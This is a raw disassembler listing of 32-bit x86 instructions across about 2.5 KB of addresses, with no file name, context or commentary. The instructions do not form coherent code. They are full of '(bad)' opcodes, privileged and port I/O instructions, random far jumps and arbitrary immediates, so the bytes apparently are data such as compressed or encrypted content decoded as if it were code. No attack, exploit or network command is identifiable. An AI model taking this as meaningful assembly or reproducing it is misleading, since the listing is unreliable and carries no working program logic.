  42fccd:	or     eax,0xf7552fe9
  42fcd2:	je     0x42fc66
  42fcd4:	(bad)  
  42fcd6:	lea    esp,[esi+0x67e04617]
  42fcdc:	inc    esp
  42fcdd:	int3   
  42fcde:	ffree  st(1)
  42fce0:	out    dx,eax
  42fce1:	mov    ds:0xc85a413b,eax
  42fce6:	call   0x37bb:0x7fc6123a
  42fced:	dec    eax
  42fcee:	push   ebx
  42fcef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcf0:	mov    cl,0x75
  42fcf2:	scas   eax,DWORD PTR es:[edi]
  42fcf3:	push   0x6f
  42fcf5:	test   al,0x8d
  42fcf7:	jns    0x42fd10
  42fcf9:	(bad)  
  42fcfa:	mov    edi,0x7b0c4378
  42fcff:	fild   DWORD PTR [esi-0x5]
  42fd02:	xchg   ebp,eax
  42fd03:	(bad)
  42fd07:	stos   DWORD PTR es:[edi],eax
  42fd08:	fdecstp 
  42fd0a:	daa    
  42fd0b:	rol    DWORD PTR [eax],0x3a
  42fd0e:	inc    eax
  42fd0f:	adc    ecx,DWORD PTR [edi+0x25]
  42fd12:	retf   0x482b
  42fd15:	jae    0x42fd29
  42fd17:	lds    edx,FWORD PTR [ecx-0x66]
  42fd1a:	scas   eax,DWORD PTR es:[edi]
  42fd1b:	inc    eax
  42fd1c:	mov    bh,0xe7
  42fd1e:	xchg   edi,eax
  42fd1f:	mov    dh,0x24
  42fd21:	dec    ebp
  42fd22:	sub    ch,ah
  42fd24:	dec    ecx
  42fd25:	stos   BYTE PTR es:[edi],al
  42fd26:	nop
  42fd27:	out    0x18,eax
  42fd29:	bound  ebx,QWORD PTR [ebx-0x5a]
  42fd2c:	sub    BYTE PTR [edx-0x4],bh
  42fd2f:	cdq    
  42fd30:	dec    esp
  42fd31:	gs sar dh,cl
  42fd34:	push   eax
  42fd35:	dec    edx
  42fd36:	repnz or DWORD PTR [bp+di-0x7ae3],0x6e3334cb
  42fd40:	repnz jmp 0x74c3:0x3e9af76e
  42fd48:	fsub   DWORD PTR ds:0x2b6f62b8
  42fd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd4f:	(bad)  
  42fd50:	into   
  42fd51:	jns    0x42fd06
  42fd53:	loope  0x42fd3a
  42fd55:	adc    ebx,DWORD PTR [edi+0x45]
  42fd58:	leave  
  42fd59:	pop    ds
  42fd5a:	fisubr WORD PTR [esi+0x3c]
  42fd5d:	mov    esi,0xd4f8fdc9
  42fd62:	and    DWORD PTR [esi+0x46],edi
  42fd65:	lods   al,BYTE PTR ds:[esi]
  42fd66:	or     DWORD PTR [ebp+0x1672eeec],esp
  42fd6c:	pop    ebx
  42fd6d:	shl    bl,1
  42fd6f:	push   es
  42fd70:	sar    bh,0x66
  42fd73:	inc    edi
  42fd74:	call   0xb4ced550
  42fd79:	clc    
  42fd7a:	div    DWORD PTR [eax+0x7424810f]
  42fd80:	into   
  42fd81:	xchg   edx,eax
  42fd82:	mov    ah,0xe9
  42fd84:	iret   
  42fd85:	cmp    edi,DWORD PTR [edi+0x30]
  42fd88:	das    
  42fd89:	in     al,0x4a
  42fd8b:	jo     0x42fd28
  42fd8d:	adc    BYTE PTR [eax],dh
  42fd8f:	outs   dx,BYTE PTR ds:[esi]
  42fd90:	and    al,0xa3
  42fd92:	aaa    
  42fd93:	pop    edx
  42fd94:	inc    edi
  42fd95:	into   
  42fd96:	mov    dl,0x95
  42fd98:	cli    
  42fd99:	nop
  42fd9a:	push   ecx
  42fd9b:	dec    esi
  42fd9c:	pop    ebp
  42fd9d:	iret   
  42fd9e:	cli    
  42fd9f:	repnz int3 
  42fda1:	mov    DWORD PTR [ebx],eax
  42fda3:	(bad)  
  42fda4:	pop    edi
  42fda5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42fda7:	adc    eax,0x4c4de4e5
  42fdac:	psrld  mm7,QWORD PTR [ecx]
  42fdaf:	or     DWORD PTR [ebp-0x55db6684],ecx
  42fdb5:	sub    ebp,DWORD PTR [eax+0x16]
  42fdb8:	sbb    BYTE PTR [edi],ch
  42fdba:	mov    ebp,0x3973a8ec
  42fdbf:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
	...
  42fe31:	add    BYTE PTR [eax],al
  42fe33:	add    bl,al
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	adc    BYTE PTR [ebx],bh
  42fe42:	fist   DWORD PTR [ebx]
  42fe44:	sub    al,0xf9
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [ebx+0x55c7cccb],ah
  42fe51:	mov    ebp,0x6cdb6deb
  42fe56:	in     eax,0xa2
  42fe58:	ja     0x42fed6
  42fe5a:	push   cs
  42fe5b:	pop    es
  42fe5c:	ficom  WORD PTR [edi+ecx*4+0x1f]
  42fe60:	cmp    ecx,eax
  42fe62:	or     al,BYTE PTR [ecx]
  42fe64:	mov    esi,0x33083e75
  42fe69:	rcl    DWORD PTR [eax-0x57],0xc2
  42fe6d:	cmc    
  42fe6e:	(bad)  
  42fe6f:	cmp    dl,al
  42fe71:	mov    WORD PTR [eax],gs
  42fe73:	(bad)  
  42fe75:	cld    
  42fe76:	pop    ebx
  42fe77:	lea    edx,[edx+0x26]
  42fe7a:	adc    eax,0xbd664d27
  42fe7f:	push   ebx
  42fe80:	jmp    0x42fe32
  42fe82:	add    al,BYTE PTR [ebp-0x7f]
  42fe85:	enter  0xcfc3,0x21
  42fe89:	jb     0x42fe53
  42fe8b:	out    dx,eax
  42fe8c:	jne    0x42feb8
  42fe8e:	nop
  42fe8f:	ret    
  42fe90:	retf   0xf3e2
  42fe93:	cmp    eax,DWORD PTR [edi-0x1442c6b6]
  42fe99:	imul   esp,DWORD PTR [ecx],0x2d
  42fe9c:	shl    DWORD PTR [esi],0x0
  42fe9f:	and    al,ah
  42fea1:	enter  0x4485,0x2a
  42fea5:	add    al,0xc
  42fea7:	inc    ecx
  42fea8:	xchg   ecx,eax
  42fea9:	dec    edi
  42feaa:	xor    eax,0x834aa091
  42feaf:	test   bh,ah
  42feb1:	xor    eax,0xbf3b70e1
  42feb6:	call   DWORD PTR [ebx+edi*2+0x47]
  42feba:	jno    0x42fe51
  42febc:	cmc    
  42febd:	inc    esi
  42febe:	lods   al,BYTE PTR ds:[esi]
  42febf:	in     eax,dx
  42fec0:	rcl    BYTE PTR [esi+0x1568d64],1
  42fec6:	add    eax,0x1156e09d
  42fecb:	add    BYTE PTR [ebp-0x40],bl
  42fece:	(bad)  
  42fecf:	ja     0x42fe9a
  42fed1:	mov    ah,0x2f
  42fed3:	mov    bl,0x86
  42fed5:	mov    eax,DWORD PTR [ebx]
  42fed7:	pop    ds
  42fed8:	dec    eax
  42fed9:	lods   al,BYTE PTR ds:[esi]
  42feda:	mov    ah,BYTE PTR [esi+0x35]
  42fedd:	mov    al,BYTE PTR [eax]
  42fedf:	and    cl,al
  42fee1:	jmp    0xf35c5830
  42fee6:	jnp    0x42fe77
  42fee8:	(bad)  
  42fee9:	fsubr  DWORD PTR [edx]
  42feeb:	scas   al,BYTE PTR es:[edi]
  42feec:	jbe    0x42fe8a
  42feee:	jnp    0x42ff1e
  42fef0:	push   ebx
  42fef1:	push   esp
  42fef2:	out    dx,eax
  42fef3:	es sbb dh,bl
  42fef6:	test   BYTE PTR [ebx-0x1],bl
  42fef9:	retf   
  42fefa:	pop    edi
  42fefb:	sub    dh,BYTE PTR [ebx+esi*2]
  42fefe:	lods   al,BYTE PTR ds:[esi]
  42feff:	jmp    0xcd67:0x7ba1aa1a
  42ff06:	mov    ds:0xb1e1b64e,eax
  42ff0b:	adc    DWORD PTR [ebp-0x32431e36],0x6222d42c
  42ff15:	mov    ebx,DWORD PTR [esi-0x3f]
  42ff18:	cmp    DWORD PTR [eax+0x1f],eax
  42ff1b:	in     eax,dx
  42ff1c:	xor    eax,0xa0b79331
  42ff21:	hlt    
  42ff22:	test   eax,0x352acf3c
  42ff27:	repnz mov bh,0xe9
  42ff2a:	je     0x42ff53
  42ff2c:	xor    DWORD PTR [ebx-0x764623f4],esp
  42ff32:	sti    
  42ff33:	push   ds
  42ff34:	ret    
  42ff35:	xor    al,0xee
  42ff37:	fadd   DWORD PTR [ecx+0x4794422e]
  42ff3d:	sub    eax,0x9fa1d2
	...
  42ffb2:	add    BYTE PTR [eax],al
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0xf768016]
  42ffc1:	xor    dh,BYTE PTR [edi+eiz*8+0x1fa21]
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [eax+0x6e23e8e9],al
  42ffd1:	sub    al,0x65
  42ffd3:	or     DWORD PTR [ebx-0x3b],esp
  42ffd6:	cmp    eax,0x7b5f93b1
  42ffdb:	dec    eax
  42ffdc:	(bad)  
  42ffdd:	mov    dh,0xa1
  42ffdf:	cmp    eax,0xb17d1f93
  42ffe4:	out    0x1a,al
  42ffe6:	cmp    DWORD PTR [esi+0x8d02a05],esi
  42ffec:	test   BYTE PTR [eax+0x79],al
  42ffef:	cs push edi
  42fff1:	push   ecx
  42fff2:	adc    al,0xab
  42fff4:	rcr    BYTE PTR [ebp+0xf],cl
  42fff7:	pop    ds
  42fff8:	fcmovb st,st(6)
  42fffa:	mov    ds:0xebd55b78,al
  42ffff:	cmp    eax,0x1ab633b2
  430004:	sti    
  430005:	retf   0x939
  430008:	inc    ecx
  430009:	outs   dx,DWORD PTR ds:[esi]
  43000a:	sub    eax,0x77199147
  43000f:	sbb    BYTE PTR [ecx+0xa],al
  430012:	loop   0x430051
  430014:	mov    bh,0xba
  430016:	icebp  
  430017:	out    dx,eax
  430018:	or     eax,0xf20c7484
  43001d:	nop
  43001e:	push   ebx
  43001f:	pop    ecx
  430020:	mov    esi,0x91e60422
  430025:	sub    eax,ecx
  430027:	test   al,0x6d
  430029:	and    BYTE PTR [eax],bl
  43002b:	push   ebp
  43002c:	mov    esi,DWORD PTR [edi-0x62930b60]
  430032:	ret    
  430033:	or     BYTE PTR [ecx+0x35],al
  430036:	nop
  430037:	jns    0x430027
  430039:	ins    DWORD PTR es:[edi],dx
  43003a:	and    ecx,esi
  43003c:	test   DWORD PTR [edx-0x9],esi
  43003f:	jno    0x430060
  430041:	or     edx,ecx
  430043:	je     0x430022
  430045:	or     eax,0xc7e8a35a
  43004a:	or     ebp,esp
  43004c:	iret   
  43004d:	inc    eax
  43004e:	xor    al,0xf7
  430050:	push   esi
  430051:	dec    ebp
  430052:	arpl   WORD PTR [eax-0x29a20f66],si
  430058:	or     eax,0x69236565
  43005d:	cdq    
  43005e:	ror    DWORD PTR [ecx-0x79c0596c],1
  430064:	addr16 inc esp
  430066:	fldpi  
  430068:	jne    0x430045
  43006a:	jl     0x430004
  43006c:	(bad)  [edi]
  43006e:	lods   eax,DWORD PTR ds:[esi]
  43006f:	stc    
  430070:	fsubr  st,st(4)
  430072:	test   al,0x4c
  430074:	mov    ds:0x1a9e712e,al
  430079:	(bad)  
  43007a:	mov    ds:0xe7bb8129,al
  43007f:	mov    DWORD PTR [eax],ebx
  430081:	sub    bh,dl
  430083:	mul    BYTE PTR [ebp+0x4c4920e4]
  430089:	xor    eax,0xee18ce5
  43008e:	mov    edx,0x7593edc8
  430093:	push   ecx
  430094:	inc    ebp
  430095:	dec    edi
  430096:	ret    
  430097:	rol    DWORD PTR ds:[eax-0x6828a80b],1
  43009e:	pop    esp
  43009f:	imul   ebx,DWORD PTR [eax],0x6c
  4300a2:	push   esp
  4300a3:	in     eax,dx
  4300a4:	test   BYTE PTR [ecx],dl
  4300a6:	push   ss
  4300a7:	xor    eax,0x896bf2ce
  4300ac:	ret    
  4300ad:	mov    esp,0xeedcf63d
  4300b2:	cmp    edx,DWORD PTR [esi+0x41]
  4300b5:	retf   0xd7db
  4300b8:	cwde   
  4300b9:	ficom  WORD PTR [eax]
  4300bb:	jp     0x4300e2
  4300bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300be:	xchg   DWORD PTR [edi+0x38],eax
	...
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x4470:0x79d7a608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    BYTE PTR [eax],ch
  43014d:	ret    
  43014e:	jecxz  0x4300f3
  430150:	repnz imul BYTE PTR [ebx+0x751cfa79]
  430157:	cmp    al,0xe4
  430159:	xchg   esi,eax
  43015a:	mov    ah,0xe0
  43015c:	xchg   ebx,eax
  43015d:	xchg   ecx,eax
  43015e:	gs out dx,al
  430160:	mul    DWORD PTR [esp+esi*8-0x25adc944]
  430167:	cld    
  430168:	dec    ecx
  430169:	lods   eax,DWORD PTR ds:[esi]
  43016a:	jbe    0x43017d
  43016c:	repnz adc edx,edx
  43016f:	mov    DWORD PTR [ecx+0x1d524d01],edi
  430175:	test   DWORD PTR [edx+0x248a3f37],ebx
  43017b:	or     ebp,DWORD PTR [eax+0x296bf90a]
  430181:	xor    eax,0x6e23d33d
  430186:	inc    eax
  430187:	push   0xffffffc1
  430189:	sbb    BYTE PTR [edi+ebp*1],dh
  43018c:	and    al,0x1a
  43018e:	cwde   
  43018f:	fst    QWORD PTR [ebp-0x21]
  430192:	test   DWORD PTR [eax+0x12],0xbf23a61f
  430199:	xor    esp,DWORD PTR [edi+0x74]
  43019c:	xchg   DWORD PTR [ebx-0x57],eax
  43019f:	sbb    ebx,DWORD PTR [eax+0x3dcc0fd6]
  4301a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301a6:	sbb    bh,cl
  4301a8:	stos   DWORD PTR es:[edi],eax
  4301a9:	mov    edx,0xad91a0c2
  4301ae:	cs xor eax,0x2db7116e
  4301b4:	mov    ds:0x86a03941,eax
  4301b9:	(bad)  
  4301ba:	and    ebp,DWORD PTR [edx+0x77]
  4301bd:	push   eax
  4301be:	mov    esp,0x7cce43c4
  4301c3:	mov    eax,ds:0x97f20de0
  4301c8:	jmp    0xb57c:0x380b40c9
  4301cf:	aas    
  4301d0:	in     eax,0x46
  4301d2:	daa    
  4301d3:	sti    
  4301d4:	push   ss
  4301d5:	out    dx,al
  4301d6:	adc    DWORD PTR [ebp+0x56],0x7f
  4301da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301db:	out    dx,al
  4301dc:	dec    ebp
  4301dd:	rcr    BYTE PTR [edx],0xda
  4301e0:	dec    edx
  4301e1:	push   cs
  4301e2:	mov    al,ds:0xe61cb6ce
  4301e7:	ins    DWORD PTR es:[di],dx
  4301e9:	jno    0x4301be
  4301eb:	xchg   ecx,eax
  4301ec:	jle    0x4301b8
  4301ee:	test   al,0xa4
  4301f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301f1:	cmp    bl,BYTE PTR [eax+0x35]
  4301f4:	sar    DWORD PTR [edi-0x6f],cl
  4301f7:	fnstsw WORD PTR [ebx+0x74]
  4301fa:	fst    QWORD PTR [ebx-0x47e5f96f]
  430200:	cdq    
  430201:	std    
  430202:	xor    BYTE PTR [ebx+edx*1+0x8],0xf8
  430207:	inc    eax
  430208:	stc    
  430209:	outs   dx,BYTE PTR ds:[esi]
  43020a:	xchg   DWORD PTR [ebp-0x31f06538],edi
  430210:	and    eax,esi
  430212:	mov    edx,0xfe6f7a2e
  430217:	rcl    BYTE PTR [esp+eax*8],1
  43021a:	scas   eax,DWORD PTR es:[edi]
  43021b:	mov    cl,0x23
  43021d:	push   edx
  43021e:	or     eax,DWORD PTR [edx]
  430220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430221:	sbb    eax,0x1febcdc0
  430226:	fcom   st(2)
  430228:	jmp    0x43024c
  43022a:	es dec ebx
  43022c:	mov    edx,0x12c529d
  430231:	lods   eax,DWORD PTR ds:[esi]
  430232:	push   0xbabefb97
  430237:	adc    eax,0x5dc16d36
  43023c:	xchg   edi,eax
  43023d:	ss adc eax,0x5994
	...
  4302b3:	add    BYTE PTR [ebp-0x5075f7e6],bh
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302c1:	data16 jo 0x4302b4
  4302c4:	or     edi,esp
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [eax+0x67],cl
  4302ce:	sbb    al,0x1
  4302d0:	iret   
  4302d1:	pop    edx
  4302d2:	retf   0x49ca
  4302d5:	mov    ecx,DWORD PTR [edx+edx*1-0x4d23d697]
  4302dc:	lea    esp,[edx]
  4302de:	mov    WORD PTR [edx],gs
  4302e0:	dec    edx
  4302e1:	cmp    BYTE PTR [eax+0x51],0x2e
  4302e5:	aam    0x81
  4302e7:	xchg   edi,eax
  4302e8:	fwait
  4302e9:	loope  0x430314
  4302eb:	mov    eax,ds:0x5f7b0c74
  4302f0:	jle    0x430296
  4302f2:	loope  0x4302e4
  4302f4:	cmp    BYTE PTR [ecx],cl
  4302f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302f7:	call   0xe886:0x7c919b4a
  4302fe:	add    DWORD PTR [eax-0xdd5588c],edi
  430304:	mov    dh,0xea
  430306:	pop    es
  430307:	aam    0xb4
  430309:	sahf   
  43030a:	adc    DWORD PTR [ebp-0x58],ecx
  43030d:	inc    edi
  43030e:	push   es
  43030f:	dec    eax
  430310:	inc    edx
  430311:	(bad)  
  430313:	jmp    0xd1cc3024
  430318:	sub    al,BYTE PTR [edi-0x23]
  43031b:	daa    
  43031c:	xchg   edi,eax
  43031d:	pop    eax
  43031e:	mov    dl,0x8
  430320:	test   esp,ebp
  430322:	jle    0x430367
  430324:	jo     0x43035c
  430326:	push   ebx
  430327:	in     al,0x7b
  430329:	arpl   bx,di
  43032b:	cmp    BYTE PTR [eax+0x1e],ah
  43032e:	add    eax,0xe2509140
  430333:	es pop ebp
  430335:	jb     0x4302c9
  430337:	ror    BYTE PTR ds:[ebx],cl
  43033a:	test   BYTE PTR [esi],bh
  43033c:	pop    ebp
  43033d:	ja     0x430353
  43033f:	pop    ss
  430340:	jnp    0x4302d6
  430342:	repz cmp ebx,DWORD PTR [edi+0xb]
  430346:	test   DWORD PTR [ebx],esp
  430348:	lea    esp,[esi]
  43034a:	lea    ebp,[esp+edx*1]
  43034d:	daa    
  43034e:	lahf   
  43034f:	sahf   
  430350:	cs stos DWORD PTR es:[edi],eax
  430352:	arpl   WORD PTR [ebx],cx
  430354:	mov    ah,0x6
  430356:	jo     0x430367
  430358:	jno    0x430343
  43035a:	dec    edx
  43035b:	dec    ecx
  43035c:	add    esp,DWORD PTR [ebp+0x68]
  43035f:	shl    BYTE PTR [edx],1
  430361:	push   eax
  430362:	jl     0x43035f
  430364:	sub    eax,0xaeae12fb
  430369:	inc    edi
  43036a:	mov    edi,0x6f44edbd
  43036f:	push   ebx
  430370:	and    eax,0x4600b368
  430375:	cdq    
  430376:	and    DWORD PTR [esi+0x776bc140],esi
  43037c:	pop    eax
  43037d:	sbb    eax,0xece46f8d
  430382:	xor    BYTE PTR [ecx+esi*1],0xce
  430386:	adc    eax,0x6a8d4d9e
  43038b:	and    ecx,DWORD PTR [ebx-0x3f]
  43038e:	lods   al,BYTE PTR ds:[esi]
  43038f:	aad    0xb9
  430391:	enter  0x85a9,0x5
  430395:	in     al,0x18
  430397:	mov    edi,0x33c75164
  43039c:	adc    DWORD PTR [edx+0xa676ff5],ecx
  4303a2:	xchg   DWORD PTR [edx+0x6e],edx
  4303a5:	sub    DWORD PTR [eax-0x22bddb96],ebx
  4303ab:	mov    ebp,0x8102ab0e
  4303b0:	push   0xd
  4303b2:	es xor al,0xb7
  4303b5:	loop   0x430352
  4303b7:	stos   DWORD PTR es:[edi],eax
  4303b8:	scas   al,BYTE PTR es:[edi]
  4303b9:	add    ecx,ebp
  4303bb:	xchg   esp,eax
  4303bc:	mov    ebx,DWORD PTR [ecx-0x1b]
  4303bf:	fisttp QWORD PTR ds:0x0
	...
  430431:	add    BYTE PTR [eax],al
  430433:	add    BYTE PTR [edi],dh
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0x8d107923
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    BYTE PTR [eax+0x24],dh
  43044e:	(bad)  
  43044f:	xchg   edi,eax
  430450:	xor    dl,BYTE PTR [esi-0x2e]
  430453:	sbb    ebp,edx
  430455:	xchg   edi,eax
  430456:	call   0x51a6:0x94f8921b
  43045d:	inc    ebp
  43045e:	jb     0x4303f2
  430460:	jmp    0x3cb4:0x70b4434d
  430467:	push   ss
  430468:	pop    eax
  430469:	test   edi,edi
  43046b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43046c:	mov    eax,0x16f3f0c6
  430471:	fisttp QWORD PTR [edi+edi*2-0x13]
  430475:	add    eax,0xdeb0fbe9
  43047a:	fcompp 
  43047c:	popf   
  43047d:	mov    ecx,0x40427a07
  430482:	aad    0xfe
  430484:	mov    ds:0xb60b090c,al
  430489:	adc    esi,esp
  43048b:	push   DWORD PTR [esi-0x4484d568]
  430491:	sti    
  430492:	adc    DWORD PTR ds:[ebx],eax
  430495:	test   BYTE PTR [edx+0x75],bh
  430498:	push   0xffffff84
  43049a:	smsw   WORD PTR [ebp-0x7919f50f]
  4304a1:	das    
  4304a2:	sbb    BYTE PTR [ebx-0x3a],al
  4304a5:	retf   0x45ae
  4304a8:	shl    DWORD PTR [ebp-0xf1e8a27],0xaa
  4304af:	fidivr WORD PTR [ebx-0x2ddd1bf4]
  4304b5:	into   
  4304b6:	add    BYTE PTR [ebx],dh
  4304b8:	retf   
  4304b9:	push   ss
  4304ba:	pushf  
  4304bb:	ins    BYTE PTR es:[edi],dx
  4304bc:	adc    edx,edi
  4304be:	jns    0x4304bc
  4304c0:	jae    0x430500
  4304c2:	(bad)  
  4304c3:	jmp    0x5175c98a
  4304c8:	dec    ebp
  4304c9:	cmp    DWORD PTR [eax-0x31],0x3d670ec3
  4304d0:	xchg   ebp,eax
  4304d1:	add    eax,0x93315dd6
  4304d6:	jbe    0x430476
  4304d8:	mov    BYTE PTR [edx],bh
  4304da:	loope  0x4304c5
  4304dc:	aaa    
  4304dd:	or     DWORD PTR [esi-0x2a],0xbf814bb6
  4304e4:	add    al,0x37
  4304e6:	push   0xf7fd7c4e
  4304eb:	add    BYTE PTR [ecx+0x5b77b12e],cl
  4304f1:	dec    esp
  4304f2:	repnz sub cl,dh
  4304f5:	pop    ds
  4304f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304f7:	fsub   QWORD PTR [eax]
  4304f9:	imul   ecx,DWORD PTR ds:0x8078a56a,0xe04ed01f
  430503:	out    dx,al
  430504:	vpaddw ymm2,ymm3,YMMWORD PTR [eax-0xa6dabd1]
  43050c:	icebp  
  43050d:	aad    0x49
  43050f:	xchg   DWORD PTR [ecx],eax
  430511:	mov    ds:0x2e423485,al
  430516:	mov    ch,0xd2
  430518:	add    eax,0xbc476197
  43051d:	lahf   
  43051e:	retf   0x7d48
  430521:	cli    
  430522:	dec    eax
  430523:	mov    ch,ch
  430525:	rcr    BYTE PTR [edi],0xeb
  430528:	dec    esi
  430529:	mov    dh,0x37
  43052b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43052c:	mov    ch,BYTE PTR [ecx+0x3b]
  43052f:	lods   eax,DWORD PTR ds:[esi]
  430530:	jg     0x430572
  430532:	test   DWORD PTR [eax+0x62],edx
  430535:	dec    edi
  430536:	jl     0x4304fa
  430538:	outs   dx,DWORD PTR ds:[esi]
  430539:	and    edi,ecx
  43053b:	push   ss
  43053c:	adc    DWORD PTR [ebx+0x780e01],esi
	...
  4305b2:	add    BYTE PTR [eax],al
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x46]
  4305c1:	sbb    dh,BYTE PTR [ecx+ebp*4]
  4305c4:	cmc    
  4305c5:	std    
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [ebx+edx*2+0xb9849f8],cl
  4305d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305d3:	inc    DWORD PTR [ebx+0x4ef95517]
  4305d9:	data16 cld 
  4305db:	mov    ebp,0x2d030956
  4305e0:	in     eax,0x6c
  4305e2:	and    BYTE PTR [edi+0x62],0xd1
  4305e6:	frstor ds:0x5cdf5648
  4305ec:	std    
  4305ed:	inc    edi
  4305ee:	loop   0x43057c
  4305f0:	adc    eax,0xf7ccae10
  4305f5:	add    ebx,DWORD PTR [ebx]
  4305f7:	adc    ah,bh
  4305f9:	test   eax,0xdd334ff8
  4305fe:	jo     0x430598
  430600:	mov    ecx,0x9b91bd51
  430605:	lahf   
  430606:	or     al,0x91
  430608:	cli    
  430609:	push   ds
  43060a:	pop    edi
  43060b:	loop   0x4305fe
  43060d:	pushf  
  43060e:	sub    eax,0xa2939c80
  430613:	ss aas 
  430615:	jo     0x4305fe
  430617:	and    DWORD PTR [eax-0x1cf18f59],ecx
  43061d:	nop
  43061e:	mov    DWORD PTR [ebp-0x64],edx
  430621:	add    eax,0x1d04297a
  430626:	arpl   WORD PTR [ecx+0x53],ax
  430629:	ret    
  43062a:	sub    BYTE PTR [ebx+0x1e],dl
  43062d:	push   ecx
  43062e:	jns    0x4305c9
  430630:	fadd   DWORD PTR [eax]
  430632:	or     esi,DWORD PTR [edi+0x2b131310]
  430638:	jo     0x43064a
  43063a:	idiv   DWORD PTR [ebx-0x49956f3]
  430640:	pop    ss
  430641:	pop    es
  430642:	mov    bh,0x6c
  430644:	lock retf 0xefcb
  430648:	add    dh,BYTE PTR [esi-0x347b7dfd]
  43064e:	fisub  WORD PTR ds:0x21c8590d
  430654:	iret   
  430655:	mov    cl,0x79
  430657:	mov    ch,0xfb
  430659:	xor    BYTE PTR [ebx+0x6af5e933],dl
  43065f:	mov    ds:0x462be269,al
  430664:	loopne 0x43064a
  430666:	test   BYTE PTR [eax+0x5d818141],bl
  43066c:	jg     0x43069e
  43066e:	cmp    al,0x8a
  430670:	lods   eax,DWORD PTR ds:[esi]
  430671:	jnp    0x430641
  430673:	(bad)  
  430675:	imul   ebx,edx,0x8627ea0a
  43067b:	mov    ecx,0x200dd9be
  430680:	sbb    ebx,ebp
  430682:	xchg   edi,eax
  430683:	mov    esi,0x81c21f3a
  430688:	cmp    al,0x5c
  43068a:	xor    DWORD PTR [eax-0x32651bca],ebx
  430690:	mov    al,0x4
  430692:	mov    edx,0xd1a0b07f
  430697:	pop    edx
  430698:	xchg   ebp,eax
  430699:	mov    dl,0xd3
  43069b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43069c:	add    eax,0xaa33b72e
  4306a1:	(bad)  
  4306a2:	mov    eax,ds:0x6acd546a
  4306a7:	sub    al,0xfa
  4306a9:	popf   
  4306aa:	vpsrld ymm4,ymm3,XMMWORD PTR [edx+0x2b4ad44]
  4306b2:	faddp  st(5),st
  4306b4:	adc    edi,0x7a5dabcd
  4306ba:	es push es
  4306bc:	or     bl,BYTE PTR [esi+edi*8]
  4306bf:	and    cl,dh
	...
  430731:	add    BYTE PTR [eax],al
  430733:	add    BYTE PTR [ecx-0x5f],dh
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x49
  430741:	sbb    BYTE PTR [ecx+0x1feea80],al
  430747:	add    ch,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [ebx+0x76],al
  43074e:	aad    0xab
  430750:	retf   
  430751:	and    ebp,DWORD PTR ds:0x2200c68d
  430757:	arpl   WORD PTR [ebx+0x4a7cbf24],sp
  43075d:	fstp   st(3)
  43075f:	xchg   esi,eax
  430760:	imul   ecx,edx,0x7979ba68
  430766:	push   cs
  430767:	jnp    0x4307a2
  430769:	lods   al,BYTE PTR ds:[esi]
  43076a:	gs xchg esp,eax
  43076c:	or     BYTE PTR [ebx+0x68356640],dl
  430772:	arpl   ax,bx
  430774:	and    DWORD PTR [ebx+0x5ac45aab],esi
  43077a:	mov    dl,0x35
  43077c:	pusha  
  43077d:	imul   esp,DWORD PTR [eax+0x6],0xffffff9b
  430781:	bound  ebp,QWORD PTR ds:0xc1efcc4e
  430787:	pop    eax
  430788:	in     eax,0x7d
  43078a:	outs   dx,BYTE PTR ds:[esi]
  43078b:	call   0x7528af3c
  430790:	cdq    
  430791:	fwait
  430792:	and    BYTE PTR ds:0x481b424a,al
  430798:	daa    
  430799:	mov    ds:0x954949e5,al
  43079e:	mov    al,ds:0xd7c8482a
  4307a3:	push   0x7853ed3a
